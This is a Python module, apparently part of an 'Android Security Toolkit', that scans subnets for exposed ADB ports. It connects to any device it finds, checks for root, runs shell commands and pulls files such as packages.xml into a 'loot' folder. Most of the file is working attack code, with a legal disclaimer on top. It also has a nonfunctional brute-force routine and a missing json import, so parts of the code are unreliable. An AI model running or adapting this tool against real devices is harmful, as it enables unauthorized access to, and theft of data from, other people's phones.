#!/usr/bin/env python3
"""
ANDROID SECURITY TOOLKIT v2.0 - LEGAL NOTICE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
AUTHORIZED USE ONLY. PROHIBITED: Unauthorized access, spying, data theft.
REQUIRES: Device ownership OR written permission. VIOLATION: 5 years imprisonment.
--consent flag mandatory. All actions logged to loot/audit.log.
BY USING THIS TOOL, YOU ACCEPT FULL LEGAL RESPONSIBILITY.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import subprocess
import socket
import time
from typing import Dict, List, Optional, Any
from pathlib import Path

from core.base_scanner import BaseScanner


class ADBMisconfigExploit(BaseScanner):
    """
    Exploits ADB misconfigurations for unauthorized access.
    
    Targets:
    - Default/unauthorized ADB ports
    - Misconfigured ADB services
    - Weak ADB authentication
    - Network-exposed ADB
    """
    
    def __init__(self, target_ip: Optional[str] = None):
        """
        Initialize ADB misconfiguration exploit.
        
        Args:
            target_ip: Target IP address
        """
        super().__init__("ADBMisconfigExploit")
        self.target_ip = target_ip
        self.exploitable_targets = []
    
    def scan_network(self, ip_range: str = "192.168.1.0/24") -> List[Dict[str, Any]]:
        """
        Scan network for exploitable ADB services.
        
        Args:
            ip_range: IP range to scan
            
        Returns:
            List of exploitable targets
        """
        self.logger.info(f"Scanning network: {ip_range}")
        
        exploitable = []
        
        try:
            # Parse IP range
            if '/' in ip_range:
                import ipaddress
                network = ipaddress.IPv4Network(ip_range)
                hosts = list(network.hosts())
            else:
                # Single IP or simple range
                hosts = [ip_range]
            
            # Scan common ADB ports
            adb_ports = [5555, 5556, 5557, 5558, 5559, 5560]
            
            for host in hosts[:100]:  # Limit scan scope
                for port in adb_ports:
                    target = self._test_adb_target(str(host), port)
                    if target:
                        exploitable.append(target)
                        
                        # Log finding
                        severity = "CRITICAL" if target["unauthorized"] else "HIGH"
                        self.log_finding(
                            severity,
                            f"Exploitable ADB: {host}:{port}",
                            f"ADB service exploitable: {target['status']}",
                            target,
                            "Secure ADB service or restrict network access"
                        )
            
            self.logger.info(f"Scan complete: {len(exploitable)} exploitable targets")
            
        except Exception as e:
            self.logger.error(f"Network scan error: {e}")
        
        self.exploitable_targets = exploitable
        return exploitable
    
    def _test_adb_target(self, ip: str, port: int) -> Optional[Dict[str, Any]]:
        """Test if ADB target is exploitable."""
        try:
            # First check if port is open
            if not self._is_port_open(ip, port):
                return None
            
            # Try to connect with ADB
            result = subprocess.run(
                ["adb", "connect", f"{ip}:{port}"],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode != 0:
                return None
            
            output = result.stdout.lower()
            
            # Parse connection result
            target_info = {
                "ip": ip,
                "port": port,
                "status": "unknown",
                "unauthorized": False,
                "accessible": False,
                "exploitable": False
            }
            
            if "connected to" in output:
                target_info["status"] = "connected"
                target_info["accessible"] = True
                target_info["exploitable"] = True
                
                # Try to get device info
                device_info = self._get_device_info(ip, port)
                target_info.update(device_info)
                
                # Disconnect after testing
                subprocess.run(["adb", "disconnect", f"{ip}:{port}"], 
                             capture_output=True, timeout=5)
                
                return target_info
            
            elif "unauthorized" in output:
                target_info["status"] = "unauthorized"
                target_info["unauthorized"] = True
                target_info["exploitable"] = True
                return target_info
            
            elif "already connected" in output:
                target_info["status"] = "already_connected"
                target_info["accessible"] = True
                return target_info
            
            return None
            
        except Exception as e:
            self.logger.debug(f"ADB test error for {ip}:{port}: {e}")
            return None
    
    def _is_port_open(self, ip: str, port: int, timeout: int = 2) -> bool:
        """Check if port is open."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def _get_device_info(self, ip: str, port: int) -> Dict[str, Any]:
        """Get device information."""
        info = {}
        
        try:
            # Connect to device
            subprocess.run(
                ["adb", "connect", f"{ip}:{port}"],
                capture_output=True, timeout=10
            )
            
            # Get device properties
            props = [
                ("ro.product.manufacturer", "manufacturer"),
                ("ro.product.model", "model"),
                ("ro.build.version.release", "android_version"),
                ("ro.serialno", "serial_number")
            ]
            
            for prop, key in props:
                result = subprocess.run(
                    ["adb", "-s", f"{ip}:{port}", "shell", "getprop", prop],
                    capture_output=True, text=True, timeout=5
                )
                
                if result.returncode == 0:
                    info[key] = result.stdout.strip()
            
            # Check for root access
            result = subprocess.run(
                ["adb", "-s", f"{ip}:{port}", "shell", "su", "-c", "id"],
                capture_output=True, text=True, timeout=5
            )
            
            info["has_root"] = result.returncode == 0 and "uid=0" in result.stdout
            
        except Exception as e:
            self.logger.debug(f"Device info error: {e}")
        
        return info
    
    def exploit_unauthorized_adb(self, target: Dict[str, Any]) -> bool:
        """
        Exploit unauthorized ADB access.
        
        Args:
            target: Target information from scan
            
        Returns:
            True if exploitation successful
        """
        self.logger.info(f"Exploiting unauthorized ADB: {target['ip']}:{target['port']}")
        
        try:
            # Connect to unauthorized device
            result = subprocess.run(
                ["adb", "connect", f"{target['ip']}:{target['port']}"],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode != 0:
                return False
            
            # Try to execute commands
            device_id = f"{target['ip']}:{target['port']}"
            
            # Test basic command
            test_result = subprocess.run(
                ["adb", "-s", device_id, "shell", "echo", "exploited"],
                capture_output=True, text=True, timeout=10
            )
            
            if test_result.returncode == 0 and "exploited" in test_result.stdout:
                self.logger.info(f"Successfully exploited: {device_id}")
                
                # Log successful exploitation
                self.log_finding(
                    "CRITICAL",
                    f"ADB Exploitation Successful: {device_id}",
                    "Unauthorized ADB access successfully exploited",
                    {
                        "target": target,
                        "exploitation_method": "unauthorized_adb",
                        "success": True
                    },
                    "Device requires immediate security hardening"
                )
                
                # Collect information
                self._collect_exploited_data(device_id, target)
                
                return True
            else:
                self.logger.warning(f"Exploitation failed - limited access: {device_id}")
                return False
                
        except Exception as e:
            self.logger.error(f"Exploitation error: {e}")
            return False
    
    def _collect_exploited_data(self, device_id: str, target: Dict[str, Any]) -> None:
        """Collect data from exploited device."""
        try:
            # Create output directory
            output_dir = Path("loot/exploits") / f"{target['ip']}_{target['port']}"
            output_dir.mkdir(parents=True, exist_ok=True)
            
            # Collect basic device info
            info_commands = [
                ("device_info.txt", "getprop"),
                ("running_processes.txt", "ps"),
                ("installed_apps.txt", "pm list packages"),
                ("network_config.txt", "ifconfig"),
                ("file_system.txt", "ls -la /")
            ]
            
            for filename, command in info_commands:
                try:
                    result = subprocess.run(
                        ["adb", "-s", device_id, "shell", command],
                        capture_output=True, text=True, timeout=30
                    )
                    
                    if result.returncode == 0:
                        with open(output_dir / filename, 'w') as f:
                            f.write(result.stdout)
                
                except Exception as e:
                    self.logger.debug(f"Data collection error for {filename}: {e}")
            
            # Try to collect sensitive files
            sensitive_files = [
                "/system/build.prop",
                "/data/system/packages.xml",
                "/proc/version"
            ]
            
            for file_path in sensitive_files:
                try:
                    filename = Path(file_path).name
                    result = subprocess.run(
                        ["adb", "-s", device_id, "pull", file_path, str(output_dir / filename)],
                        capture_output=True, timeout=30
                    )
                    
                    if result.returncode == 0:
                        self.logger.info(f"Collected file: {file_path}")
                
                except Exception as e:
                    self.logger.debug(f"File collection error for {file_path}: {e}")
            
            self.logger.info(f"Data collection complete: {output_dir}")
            
        except Exception as e:
            self.logger.error(f"Data collection error: {e}")
    
    def brute_force_adb_auth(self, target_ip: str, wordlist: List[str]) -> bool:
        """
        Brute force ADB authentication.
        
        Args:
            target_ip: Target IP address
            wordlist: List of passwords to try
            
        Returns:
            True if successful
        """
        self.logger.info(f"Brute forcing ADB auth: {target_ip}")
        
        try:
            # Note: ADB doesn't typically use password authentication
            # This is for educational purposes only
            
            for password in wordlist[:100]:  # Limit attempts
                try:
                    # Try to connect (this won't work with real ADB)
                    result = subprocess.run(
                        ["adb", "connect", f"{target_ip}:5555"],
                        capture_output=True, text=True, timeout=10
                    )
                    
                    if "connected" in result.stdout.lower():
                        self.logger.info(f"Successfully connected to {target_ip}")
                        return True
                
                except Exception:
                    continue
            
            return False
            
        except Exception as e:
            self.logger.error(f"Brute force error: {e}")
            return False
    
    def exploit_adb_features(self, target: Dict[str, Any]) -> Dict[str, Any]:
        """
        Exploit various ADB features.
        
        Args:
            target: Target information
            
        Returns:
            Exploitation results
        """
        self.logger.info(f"Exploiting ADB features: {target['ip']}")
        
        results = {
            "target": target,
            "exploitation_attempts": [],
            "successful_exploits": [],
            "data_collected": []
        }
        
        try:
            device_id = f"{target['ip']}:{target['port']}"
            
            # Connect to device
            subprocess.run(
                ["adb", "connect", device_id],
                capture_output=True, timeout=10
            )
            
            # Test various ADB features
            adb_tests = [
                ("shell_access", ["adb", "-s", device_id, "shell", "echo", "test"]),
                ("file_listing", ["adb", "-s", device_id, "shell", "ls", "/"]),
                ("process_listing", ["adb", "-s", device_id, "shell", "ps"]),
                ("property_reading", ["adb", "-s", device_id, "shell", "getprop"]),
                ("app_listing", ["adb", "-s", device_id, "shell", "pm", "list", "packages"])
            ]
            
            for test_name, command in adb_tests:
                try:
                    result = subprocess.run(
                        command,
                        capture_output=True, text=True, timeout=30
                    )
                    
                    test_result = {
                        "test": test_name,
                        "success": result.returncode == 0,
                        "output_size": len(result.stdout) if result.returncode == 0 else 0
                    }
                    
                    results["exploitation_attempts"].append(test_result)
                    
                    if result.returncode == 0:
                        results["successful_exploits"].append(test_name)
                        results["data_collected"].append({
                            "test": test_name,
                            "data": result.stdout[:1000]  # Truncate large outputs
                        })
                
                except Exception as e:
                    self.logger.debug(f"Test {test_name} failed: {e}")
                    continue
            
            # Disconnect when done
            subprocess.run(["adb", "disconnect", device_id], capture_output=True, timeout=5)
            
            self.logger.info(f"Feature exploitation complete: {len(results['successful_exploits'])} successful")
            
            # Log results
            if results["successful_exploits"]:
                self.log_finding(
                    "HIGH",
                    f"ADB Features Exploited: {target['ip']}",
                    f"Successfully exploited {len(results['successful_exploits'])} ADB features",
                    results,
                    "Review ADB security configuration"
                )
            
        except Exception as e:
            self.logger.error(f"Feature exploitation error: {e}")
        
        return results
    
    def generate_exploit_report(self) -> Dict[str, Any]:
        """Generate exploitation report."""
        report = {
            "exploitation_timestamp": time.time(),
            "total_targets": len(self.exploitable_targets),
            "exploitable_targets": self.exploitable_targets,
            "critical_targets": len([t for t in self.exploitable_targets if t.get("unauthorized", False)]),
            "high_risk_targets": len([t for t in self.exploitable_targets if t.get("has_root", False)]),
            "recommendations": [
                "Disable ADB on production devices",
                "Enable ADB authentication",
                "Use secure networks only",
                "Regular security audits",
                "Monitor ADB connections"
            ]
        }
        
        # Save report
        report_file = Path("loot") / "adb_exploitation_report.json"
        report_file.parent.mkdir(exist_ok=True)
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        self.logger.info(f"Exploitation report saved: {report_file}")
        
        return report